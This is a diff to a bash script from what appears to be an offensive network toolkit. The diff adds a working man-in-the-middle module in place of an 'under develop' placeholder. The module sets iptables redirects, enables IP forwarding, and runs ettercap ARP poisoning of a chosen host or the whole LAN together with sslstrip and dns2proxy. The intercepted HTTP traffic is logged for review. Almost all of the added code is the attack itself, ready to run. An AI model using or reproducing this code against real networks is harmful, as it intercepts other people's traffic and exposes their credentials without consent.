@@ -2588,6 +2588,7 @@ t=`which sslstrip`
 if [ "$?" -eq "0" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white} sslstrip-0.9${RedF}:${GreenF} found .. ${Reset};
   sleep 1
+  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
 else
   Fail="YES"
   echo ${BlueF}[${RedF}x${BlueF}]${white} sslstrip-0.9${RedF}:${RedF} not found .. ${Reset};
@@ -2596,6 +2597,7 @@ else
   echo ""
   python setup.py build & python setup.py install
   echo ""
+  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
   cd $IPATH/
 fi
 
@@ -2603,6 +2605,7 @@ fi
 if [ -e "$IPATH/bin/Utils/dns2proxy/dns2proxy.py" ]; then
   echo ${BlueF}[${GreenF}✔${BlueF}]${white} dns2proxy${RedF}:${GreenF} found .. ${Reset};
   sleep 1
+  dnsproxypath="$IPATH/bin/Utils/dns2proxy/dns2proxy.py"
 else
   Fail="YES"
   echo ${BlueF}[${RedF}x${BlueF}]${white} dns2proxy${RedF}:${RedF} not found .. ${Reset};
@@ -2636,13 +2639,67 @@ fi
 
 
 
-
 #
 # start of module funtions ..
 #
-echo ""
-echo ${RedF}[x]${white} Please wait, Module under develop ..${Reset};
-sleep 7
+cd $IPATH/output
+if [ -e $stripath ]; then
+  :
+else
+  echo ${BlueF}[${RedF}x${BlueF}]${white} SSLSTRIP installation NOT found ..${Reset};
+  sleep 2
+  exit
+fi
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+
+  #
+  # ip fowarding in iptables
+  #
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  sleep 1
+  echo "1" > /proc/sys/net/ipv4/ip_forward
+
+  #
+  # IPTABLES SETTINGS ..
+  #
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 
+  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+
+  # ARP poison ..
+  cd $IPATH/bin/Utils/dns2proxy
+  if [ "$IpV" = "ACTIVE" ]; then
+    echo ${GreenF}[☠]${white} Using IPv6 settings ${Reset};
+    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
+    sleep 2
+    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
+  else
+    echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
+    sleep 2
+    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
+  fi
+
+
+  # clean all settings
+  sleep 2
+  echo ${BlueF}[☠]${white} cleaning settings .. ${Reset};
+  sleep 2
+  killall sslstrip > /dev/null 2>&1
+  killall python > /dev/null 2>&1
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  # reset ip-forward
+  echo "0" > /proc/sys/net/ipv4/ip_forward
+  echo ${BlueF}[☠]${white} editing sslstrip session log File ${BlueF}]${Reset};
+  sleep 4
+  xterm -T "Sslstrip session log" -e "nano $IPATH/output/log.txt"
+  sleep 2
 
 
 else
